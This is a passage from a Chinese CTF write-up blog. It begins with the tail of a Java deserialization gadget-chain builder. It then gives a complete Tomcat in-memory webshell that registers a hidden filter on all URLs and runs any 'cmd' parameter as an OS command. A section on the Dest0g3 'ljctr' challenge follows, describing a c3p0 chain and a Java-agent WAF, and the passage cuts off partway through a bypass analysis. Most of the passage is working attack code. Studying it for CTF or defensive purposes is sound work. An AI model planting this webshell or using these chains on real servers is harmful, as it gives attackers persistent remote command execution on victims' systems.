</span></span><span style="display:flex;"><span>        queueField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>templates<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//反射强写comparator
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Class clazz<span style="color:#ff79c6">=</span>queue<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Field comparatorField<span style="color:#ff79c6">=</span>clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;comparator&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        comparatorField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>queue<span style="color:#ff79c6">,</span> comparator<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> queue<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String fieldName<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span>
</span></span><span style="display:flex;"><span>            Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>fieldName<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>内存马</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> test<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.catalina.LifecycleState<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.catalina.core.StandardContext<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.catalina.loader.WebappClassLoaderBase<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.tomcat.util.descriptor.web.FilterMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.servlet.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.BufferedReader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.InputStreamReader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Method<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.charset.StandardCharsets<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">InjectTomcat01</span> <span style="color:#8be9fd;font-style:italic">extends</span> AbstractTranslet <span style="color:#8be9fd;font-style:italic">implements</span> Filter<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String filterName <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;k&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String param <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;cmd&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String filterUrlPattern <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/*&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            WebappClassLoaderBase webappClassLoaderBase <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>WebappClassLoaderBase<span style="color:#ff79c6">)</span> Thread<span style="color:#ff79c6">.</span><span style="color:#50fa7b">currentThread</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContextClassLoader</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            StandardContext standardContext <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>StandardContext<span style="color:#ff79c6">)</span> webappClassLoaderBase<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getResources</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContext</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ServletContext servletContext <span style="color:#ff79c6">=</span> standardContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getServletContext</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            Field filterConfigs <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.core.StandardContext&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;filterConfigs&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            filterConfigs<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            Map map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Map<span style="color:#ff79c6">)</span> filterConfigs<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>filterName<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> standardContext <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">){</span>
</span></span><span style="display:flex;"><span>                Field stateField <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.util.LifecycleBase&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;state&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                stateField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                stateField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">,</span> LifecycleState<span style="color:#ff79c6">.</span><span style="color:#50fa7b">STARTING_PREP</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                FilterRegistration<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Dynamic</span> filter <span style="color:#ff79c6">=</span> servletContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addFilter</span><span style="color:#ff79c6">(</span>filterName<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> InjectTomcat01<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>                filter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addMappingForUrlPatterns</span><span style="color:#ff79c6">(</span>java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">util</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">EnumSet</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">of</span><span style="color:#ff79c6">(</span>DispatcherType<span style="color:#ff79c6">.</span><span style="color:#50fa7b">REQUEST</span><span style="color:#ff79c6">),</span><span style="color:#ff79c6">false</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span>filterUrlPattern<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>                Method filterStart <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.core.StandardContext&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;filterStart&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                filterStart<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                FilterMap<span style="color:#ff79c6">[]</span> filterMaps <span style="color:#ff79c6">=</span> standardContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">findFilterMaps</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0 <span style="color:#ff79c6">;</span> i <span style="color:#ff79c6">&lt;</span> filterMaps<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++){</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>filterMaps<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">].</span><span style="color:#50fa7b">getFilterName</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">equalsIgnoreCase</span><span style="color:#ff79c6">(</span>filterName<span style="color:#ff79c6">)){</span>
</span></span><span style="display:flex;"><span>                        FilterMap filterMap <span style="color:#ff79c6">=</span> filterMaps<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>                        filterMaps<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> filterMaps<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>                        filterMaps<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> filterMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>                stateField<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>standardContext<span style="color:#ff79c6">,</span>LifecycleState<span style="color:#ff79c6">.</span><span style="color:#50fa7b">STARTED</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span><span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">){}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xalan</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xsltc</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">DOM</span> document<span style="color:#ff79c6">,</span> SerializationHandler<span style="color:#ff79c6">[]</span> handlers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xalan</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xsltc</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">DOM</span> document<span style="color:#ff79c6">,</span> com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xml</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">dtm</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">DTMAxisIterator</span> iterator<span style="color:#ff79c6">,</span> SerializationHandler handler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">init</span><span style="color:#ff79c6">(</span>FilterConfig filterConfig<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> ServletException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">doFilter</span><span style="color:#ff79c6">(</span>ServletRequest servletRequest<span style="color:#ff79c6">,</span> ServletResponse servletResponse<span style="color:#ff79c6">,</span> FilterChain filterChain<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ServletException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        String string <span style="color:#ff79c6">=</span> servletRequest<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getParameter</span><span style="color:#ff79c6">(</span>param<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>string <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">){</span>
</span></span><span style="display:flex;"><span>            String osName <span style="color:#ff79c6">=</span> System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;os.name&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            String<span style="color:#ff79c6">[]</span> cmd <span style="color:#ff79c6">=</span> osName <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> osName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toLowerCase</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">contains</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;win&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;cmd.exe&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;/c&#34;</span><span style="color:#ff79c6">,</span>string<span style="color:#ff79c6">}</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;-c&#34;</span><span style="color:#ff79c6">,</span>string<span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>            Process exec <span style="color:#ff79c6">=</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>cmd<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            BufferedReader bufferedReader <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BufferedReader<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> InputStreamReader<span style="color:#ff79c6">(</span>exec<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">()));</span>
</span></span><span style="display:flex;"><span>            StringBuffer stringBuffer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> StringBuffer<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            String lineData<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">((</span>lineData <span style="color:#ff79c6">=</span> bufferedReader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readLine</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">){</span>
</span></span><span style="display:flex;"><span>                stringBuffer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">append</span><span style="color:#ff79c6">(</span>lineData <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;\n&#39;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>            servletResponse<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>stringBuffer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getBytes</span><span style="color:#ff79c6">(</span>StandardCharsets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">UTF_8</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>            servletResponse<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            servletResponse<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        filterChain<span style="color:#ff79c6">.</span><span style="color:#50fa7b">doFilter</span><span style="color:#ff79c6">(</span>servletRequest<span style="color:#ff79c6">,</span>servletResponse<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">destroy</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h1 id="dest0g3-520-迎新赛-ljctr">Dest0g3 520 迎新赛 ljctr</h1>
<p>看看pom，发现了这个</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;groupId&gt;</span>com.mchange<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;artifactId&gt;</span>c3p0<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;version&gt;</span>0.9.5.5<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>ysoserial里有个c3p0链。但是waf.jar有一小点过滤</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">c3p0</span><span style="color:#ff79c6">(</span>Instrumentation inst<span style="color:#ff79c6">,</span> ClassLoader loader<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Class<span style="color:#ff79c6">&lt;?&gt;</span> aClass <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">,</span> loader<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ClassPool classPool1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ClassPool<span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        classPool1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertClassPath</span><span style="color:#ff79c6">((</span>ClassPath<span style="color:#ff79c6">)</span><span style="color:#ff79c6">new</span> ClassClassPath<span style="color:#ff79c6">(</span>aClass<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        classPool1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertClassPath</span><span style="color:#ff79c6">((</span>ClassPath<span style="color:#ff79c6">)</span><span style="color:#ff79c6">new</span> LoaderClassPath<span style="color:#ff79c6">(</span>aClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClassLoader</span><span style="color:#ff79c6">()));</span>
</span></span><span style="display:flex;"><span>        CtClass ctClass1 <span style="color:#ff79c6">=</span> classPool1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>aClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        CtMethod ctMethod1 <span style="color:#ff79c6">=</span> ctClass1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getObject&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;()Ljava/lang/Object;&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ctMethod1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertBefore</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">.</span><span style="color:#50fa7b">format</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34; if (reference!=null){\n            return null;\n        }&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span> AgentDemo<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span>
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">}));</span>
</span></span><span style="display:flex;"><span>        inst<span style="color:#ff79c6">.</span><span style="color:#50fa7b">redefineClasses</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> ClassDefinition<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span> <span style="color:#ff79c6">new</span> ClassDefinition<span style="color:#ff79c6">(</span>aClass<span style="color:#ff79c6">,</span> ctClass1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        ctClass1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">detach</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ctClass1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>这是用RASP中的java agent原理实现的</p>
<p><a href="https://paper.seebug.org/1041/">https://paper.seebug.org/1041/</a></p>
<p>其实就是调用ReferenceSerialized#getObject的时候加了个判断，如果reference不是null就返回</p>
<p>看了看c3p0链，在ysoserial中，getObject调用后面的referenceToObject会用到reference，这里就不能用了。但是会发现还有一个context = (Context)initialContext.lookup(this.contextName)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> Object <span style="color:#50fa7b">getObject</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> ClassNotFoundException<span style="color:#ff79c6">,</span> IOException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
